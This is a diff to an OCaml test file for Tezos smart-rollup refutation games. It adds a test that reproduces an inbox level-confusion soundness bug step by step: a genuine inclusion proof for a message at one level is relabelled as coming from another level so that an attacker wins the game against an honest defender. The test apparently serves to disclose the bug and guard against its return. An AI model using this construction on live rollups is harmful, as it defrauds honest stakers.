@@ -231,6 +231,7 @@ let test_single_valid_game_move () =
   Assert.is_none ~loc:__LOC__ ~pp:Sc_rollup_game_repr.pp_game_result game_result
 
 module Arith_pvm = Sc_rollup_helpers.Arith_pvm
+module Arith_pvm_eval = Sc_rollup_helpers.Arith_pvm_eval
 
 (** Test that sending a invalid serialized inbox proof to
     {Sc_rollup_proof_repr.valid} is rejected. *)
@@ -452,12 +453,16 @@ let test_first_move_with_invalid_ancestor () =
        (Sc_rollup_errors.Sc_rollup_not_valid_commitments_conflict
           (player_commitment_hash, player, opponent_commitment_hash, opponent)))
 
-(* Build a [Proof] step whose PVM part is genuine (so the proof verifier does
-   not raise — that would be a separate failure mode) while the inbox proof is
-   intentionally bogus. The block-validation plugin never inspects the proof's
-   contents — only the chosen section's tick distance — so any well-typed proof
-   value works here. Shared by the plugin tests. *)
-let build_adversarial_proof () =
+(* Build a repr-level [Sc_rollup_proof_repr.t] whose PVM part is a genuine Arith
+   PVM step (so the proof verifier does not raise on the PVM side — that would be
+   a separate failure mode) and whose input proof is [input_proof].
+
+   [Alpha_context.Sc_rollup.Proof] and [Sc_rollup_proof_repr] are the same module
+   underneath (see [alpha_context.ml]); only the .mli seals the types apart.
+   Carry the value across that seal through the byte-identical wire encoding so
+   it can feed the repr-level [G.Proof] consumed by [R.game_move] and by the
+   block-validation plugin. *)
+let build_repr_proof input_proof =
   let open Lwt_result_wrap_syntax in
   let pvm_ctxt = Arith_pvm.make_empty_context () in
   let empty = Arith_pvm.make_empty_state () in
@@ -474,6 +479,19 @@ let build_adversarial_proof () =
          ~pvm:(module Arith_pvm)
          pvm_step
   in
+  let alpha_proof = Alpha_context.Sc_rollup.Proof.{pvm_step; input_proof} in
+  return
+    (Data_encoding.Binary.of_bytes_exn Sc_rollup_proof_repr.encoding
+    @@ Data_encoding.Binary.to_bytes_exn
+         Alpha_context.Sc_rollup.Proof.encoding
+         alpha_proof)
+
+(* Build a [Proof] step whose PVM part is genuine (so the proof verifier does
+   not raise — that would be a separate failure mode) while the inbox proof is
+   intentionally bogus. The block-validation plugin's multi-tick check never
+   inspects the proof's contents — only the chosen section's tick distance — so
+   any well-typed proof value works here. Shared by the plugin tests. *)
+let build_adversarial_proof () =
   let inbox_proof =
     Alpha_context.Sc_rollup.Inbox.Internal_for_tests.serialized_proof_of_string
       "I am the big bad wolf"
@@ -486,19 +504,7 @@ let build_adversarial_proof () =
         proof = inbox_proof;
       }
   in
-  let alpha_proof =
-    Alpha_context.Sc_rollup.Proof.{pvm_step; input_proof = Some input_proof}
-  in
-  (* [Alpha_context.Sc_rollup.Proof] and [Sc_rollup_proof_repr] are the same
-     module underneath (see [alpha_context.ml]); only the .mli seals the types
-     apart. Carry the value across that seal through the byte-identical wire
-     encoding so it can feed the repr-level [G.Proof] consumed by
-     [R.game_move]. *)
-  return
-    (Data_encoding.Binary.of_bytes_exn Sc_rollup_proof_repr.encoding
-    @@ Data_encoding.Binary.to_bytes_exn
-         Alpha_context.Sc_rollup.Proof.encoding
-         alpha_proof)
+  build_repr_proof (Some input_proof)
 
 (* Reconstruct the [Sc_rollup_refute] operation carrying [repr_refutation]
    (given at the [Sc_rollup_game_repr] level). *)
@@ -847,6 +853,286 @@ let test_at_most_one_operation_per_game_per_block () =
       Stdlib.failwith
         "one-op-per-game: operation on a distinct game was wrongly rejected"
 
+(* End-to-end reproduction of the inbox level-confusion soundness bug showing
+   that an attacker genuinely WINS a refutation game (not merely that the move
+   is accepted).
+
+   [Sc_rollup_inbox_repr.verify_proof] (hence [Sc_rollup_proof_repr.valid])
+   never binds the level actually PROVEN by an inbox inclusion proof to the
+   [level] CLAIMED in the [Inbox_proof]. An attacker can therefore submit a
+   genuine, unmodified inclusion proof for a real message at [attacker_level]
+   while CLAIMING [victim_level] — the reconstructed input keeps the claimed
+   level but carries the attacker level's payload. Fed to a single disputed
+   PVM tick, this produces a stop state that differs from the honest defender's
+   commitment, so the refutation succeeds and the honest defender loses.
+
+   Construction (no dissection-narrowing loop needed: the disputed commitment
+   covers exactly ONE PVM tick, so the opening dissection's first section
+   [0; 1] is already distance-one):
+     1. install a genuine multi-level inbox as the on-chain inbox;
+     2. run the real Arith PVM over that inbox up to a state [s0] requesting
+        [First_after (victim_level, 2)] (i.e. right after consuming the victim
+        level's first external message);
+     3. publish a parent commitment whose state is [s0], and, sharing it as
+        predecessor, an HONEST defender commitment of exactly one tick whose
+        state is the honest result of consuming the victim level's next message
+        [(victim_level, 3)], plus a differing refuter commitment;
+     4. open the game and play a [Proof] whose PVM step genuinely consumes the
+        ATTACKER level's message [(attacker_level, 3)] wrapped as an
+        [Inbox_proof] claiming [victim_level];
+     5. assert [R.game_move] returns [Some (G.Loser {loser = defender; _})]. *)
+let test_inbox_proof_level_confusion () =
+  let open Lwt_result_wrap_syntax in
+  let open Alpha_context in
+  let* ctxt, rollup, genesis_hash, refuter, defender, _staker3 =
+    T.originate_rollup_and_deposit_with_three_stakers ()
+  in
+  (* The rollup's genuine metadata. The disputed inbox levels must lie strictly
+     above the origination level, otherwise [cut_at_level] drops the input. *)
+  let*@ ctxt, metadata_repr = Sc_rollup_storage.get_metadata ctxt rollup in
+  let origination_level_i =
+    Int32.to_int
+      (Raw_level_repr.to_int32
+         metadata_repr.Sc_rollup_metadata_repr.origination_level)
+  in
+  let victim_level_i = origination_level_i + 2 in
+  let attacker_level_i = origination_level_i + 3 in
+  let victim_level = Raw_level.of_int32_exn (Int32.of_int victim_level_i) in
+  let attacker_level = Raw_level.of_int32_exn (Int32.of_int attacker_level_i) in
+  let metadata =
+    Sc_rollup.Metadata.
+      {
+        address = rollup;
+        origination_level =
+          Raw_level.of_int32_exn (Int32.of_int origination_level_i);
+      }
+  in
+  (* Build a genuine multi-level inbox: levels [1 .. attacker_level], two
+     external messages each. [inbox_creation_level] must be [root] so that the
+     [first_block] flag lines up between the PVM inputs and the inbox
+     merkelisation (only absolute level 1 is a first block). All disputed levels
+     are [>= 2], hence regular levels whose external messages sit at indices 2
+     and 3. *)
+  let payloads_for_levels =
+    Stdlib.List.init attacker_level_i (fun i ->
+        let k = i + 1 in
+        Sc_rollup_helpers.wrap_messages
+          (Raw_level.of_int32_exn (Int32.of_int k))
+          [Printf.sprintf "l%d-m0" k; Printf.sprintf "l%d-m1" k])
+  in
+  let*? node_inbox, proto_inbox =
+    Sc_rollup_helpers.construct_node_and_protocol_inbox
+      ~inbox_creation_level:Raw_level.root
+      payloads_for_levels
+  in
+  let inputs_per_levels =
+    List.map (fun p -> p.Sc_rollup_helpers.inputs) payloads_for_levels
+  in
+  let is_reveal_enabled = Sc_rollup_helpers.is_reveal_enabled_default in
+  (* [s0]: the first PVM state requesting [First_after (victim_level, 2)]. We
+     locate it by evaluating the real Arith PVM with increasing fuel until the
+     input request matches — the honest agreed prestate of the disputed tick. *)
+  let victim_counter = Z.of_int 2 in
+  let state_is_s0 state =
+    let open Lwt_syntax in
+    let* req = Arith_pvm.is_input_state ~is_reveal_enabled state in
+    match req with
+    | Sc_rollup.First_after (l, n) ->
+        return (Raw_level.equal l victim_level && Z.equal n victim_counter)
+    | _ -> return false
+  in
+  let rec find_s0 fuel =
+    if fuel > 2000 then failwith "level-confusion: [s0] not reached"
+    else
+      let*! r =
+        Arith_pvm_eval.eval_inputs_from_initial_state
+          ~metadata
+          ~fuel
+          inputs_per_levels
+      in
+      match r with
+      | Error _ -> find_s0 (fuel + 1)
+      | Ok (state, _tick, _states) ->
+          let*! is_s0 = state_is_s0 state in
+          if is_s0 then return state else find_s0 (fuel + 1)
+  in
+  let* s0 = find_s0 1 in
+  let Sc_rollup_helpers.Node_inbox.{inbox = local_inbox; _} = node_inbox in
+  let snapshot = Sc_rollup.Inbox.take_snapshot local_inbox in
+  (* Genuine inbox proof + input for the attacker's message at
+     [(attacker_level, 3)]. [valid] reconstructs the input by verifying this
+     proof at index [succ 2 = 3]: the inclusion proof genuinely proves
+     [attacker_level], but the returned message is (unsoundly) tagged with the
+     claimed [victim_level]. *)
+  let* attacker_inbox_proof, attacker_input =
+    Sc_rollup_helpers.Node_inbox.produce_proof
+      node_inbox
+      snapshot
+      (attacker_level, Z.of_int 3)
+  in
+  (* The honest next input at [(victim_level, 3)] an honest defender consumed. *)
+  let* _honest_inbox_proof, honest_input =
+    Sc_rollup_helpers.Node_inbox.produce_proof
+      node_inbox
+      snapshot
+      (victim_level, Z.of_int 3)
+  in
+  let honest_input =
+    match honest_input with
+    | Some m -> Sc_rollup.Inbox_message m
+    | None -> assert false
+  in
+  (* Re-tag the genuine attacker-level message as [victim_level]: this is
+     exactly what [valid] reconstructs from the level-confused [Inbox_proof]. *)
+  let confused_input =
+    match attacker_input with
+    | Some {Sc_rollup.message_counter; payload; _} ->
+        Sc_rollup.Inbox_message
+          {inbox_level = victim_level; message_counter; payload}
+    | None -> assert false
+  in
+  let pvm_ctxt = Arith_pvm.make_empty_context () in
+  (* Honest single-tick step from [s0]: its stop state is what an honest
+     defender commits. *)
+  let*! honest_step =
+    Arith_pvm.produce_proof pvm_ctxt ~is_reveal_enabled (Some honest_input) s0
+  in
+  let honest_step = WithExceptions.Result.get_ok ~loc:__LOC__ honest_step in
+  let honest_stop = Arith_pvm.proof_stop_state honest_step in
+  (* Attacker single-tick step from [s0] consuming the wrong-level payload. *)
+  let*! attacker_step =
+    Arith_pvm.produce_proof pvm_ctxt ~is_reveal_enabled (Some confused_input) s0
+  in
+  let attacker_step = WithExceptions.Result.get_ok ~loc:__LOC__ attacker_step in
+  let s0_hash = Arith_pvm.proof_start_state attacker_step in
+  let attacker_stop = Arith_pvm.proof_stop_state attacker_step in
+  (* The attack genuinely refutes: feeding the wrong-level payload yields a
+     different stop state than the honest one. *)
+  let* () =
+    Assert.equal_bool
+      ~loc:__LOC__
+      (Sc_rollup.State_hash.equal attacker_stop honest_stop)
+      false
+  in
+  (* Publish the commitments carrying these REAL PVM state hashes. The disputed
+     defender commitment covers exactly one tick, so the game opens directly on
+     a distance-one section. *)
+  let level_of = T.valid_inbox_level ctxt in
+  let parent_commit =
+    Commitment_repr.
+      {
+        predecessor = genesis_hash;
+        inbox_level = level_of 1l;
+        number_of_ticks = T.number_of_ticks_exn 1L;
+        compressed_state = s0_hash;
+      }
+  in
+  let*@ parent_hash, _, ctxt =
+    T.advance_level_n_refine_stake ctxt rollup defender parent_commit
+  in
+  let defender_commit =
+    Commitment_repr.
+      {
+        predecessor = parent_hash;
+        inbox_level = level_of 2l;
+        number_of_ticks = T.number_of_ticks_exn 1L;
+        compressed_state = honest_stop;
+      }
+  in
+  let refuter_commit =
+    Commitment_repr.
+      {
+        predecessor = parent_hash;
+        inbox_level = level_of 2l;
+        number_of_ticks = T.number_of_ticks_exn 1L;
+        compressed_state = hash_string "refuter-genuine-attack";
+      }
+  in
+  let ctxt = T.advance_level_for_commitment ctxt defender_commit in
+  let*@ _, _, ctxt, _ =
+    Sc_rollup_stake_storage.publish_commitment
+      ctxt
+      rollup
+      defender
+      defender_commit
+  in
+  let*@ _, _, ctxt, _ =
+    Sc_rollup_stake_storage.publish_commitment
+      ctxt
+      rollup
+      refuter
+      refuter_commit
+  in
+  let defender_commitment_hash =
+    Sc_rollup_commitment_repr.hash_uncarbonated defender_commit
+  in
+  let refuter_commitment_hash =
+    Sc_rollup_commitment_repr.hash_uncarbonated refuter_commit
+  in
+  (* Install the genuine multi-level inbox as the on-chain inbox so that the
+     game's [inbox_snapshot] is a real multi-level inbox (the precondition for
+     an inbox inclusion proof to verify). Carry [proto_inbox] across the .mli
+     seal through the wire encoding. *)
+  let inbox_repr =
+    Data_encoding.Binary.of_bytes_exn Sc_rollup_inbox_repr.encoding
+    @@ Data_encoding.Binary.to_bytes_exn Sc_rollup.Inbox.encoding proto_inbox
+  in
+  let*! ctxt = Storage.Sc_rollup.Inbox.add ctxt inbox_repr in
+  (* Open the game. Its opening dissection is
+     [(s0, 0); (honest_stop, 1); (None, 2)], so [choice = tick 0] selects the
+     already distance-one section [0; 1]. *)
+  let*@ ctxt =
+    R.start_game
+      ctxt
+      rollup
+      ~player:(refuter, refuter_commitment_hash)
+      ~opponent:(defender, defender_commitment_hash)
+  in
+  (* The level-confused [Inbox_proof]: a genuine inclusion proof of the message
+     at [attacker_level] wrapped as if it were at [victim_level]. *)
+  let input_proof =
+    Sc_rollup.Proof.Inbox_proof
+      {
+        level = victim_level;
+        message_counter = victim_counter;
+        proof = Sc_rollup.Inbox.to_serialized_proof attacker_inbox_proof;
+      }
+  in
+  let pvm_step =
+    WithExceptions.Result.get_ok ~loc:__LOC__
+    @@ Sc_rollup.Proof.serialize_pvm_step ~pvm:(module Arith_pvm) attacker_step
+  in
+  let alpha_proof =
+    Sc_rollup.Proof.{pvm_step; input_proof = Some input_proof}
+  in
+  (* Carry the proof across the [Alpha_context.Sc_rollup.Proof] / repr seal. *)
+  let proof =
+    Data_encoding.Binary.of_bytes_exn Sc_rollup_proof_repr.encoding
+    @@ Data_encoding.Binary.to_bytes_exn Sc_rollup.Proof.encoding alpha_proof
+  in
+  let*@ game_result, _ctxt =
+    R.game_move
+      ctxt
+      rollup
+      ~player:refuter
+      ~opponent:defender
+      ~choice:Sc_rollup_tick_repr.initial
+      ~step:(G.Proof proof)
+  in
+  match game_result with
+  | Some (G.Loser {loser; _}) ->
+      Assert.equal_bool
+        ~loc:__LOC__
+        (Sc_rollup_repr.Staker.equal loser defender)
+        true
+  | Some G.Draw ->
+      Test.fail
+        "level-confusion: the attack resolved to a Draw instead of a win"
+  | None ->
+      Test.fail
+        "level-confusion: the wrong-level proof did not win the game \
+         (game_move returned None instead of Loser defender)"
+
 let tests =
   [
     Tztest.tztest
@@ -891,6 +1177,11 @@ let tests =
       "The plugin allows at most one operation per refutation game per block."
       `Quick
       test_at_most_one_operation_per_game_per_block;
+    Tztest.tztest
+      "An inbox proof whose proven level does not match the claimed level lets \
+       the attacker win the refutation game (level-confusion soundness bug)."
+      `Quick
+      test_inbox_proof_level_confusion;
   ]
 
 let () =
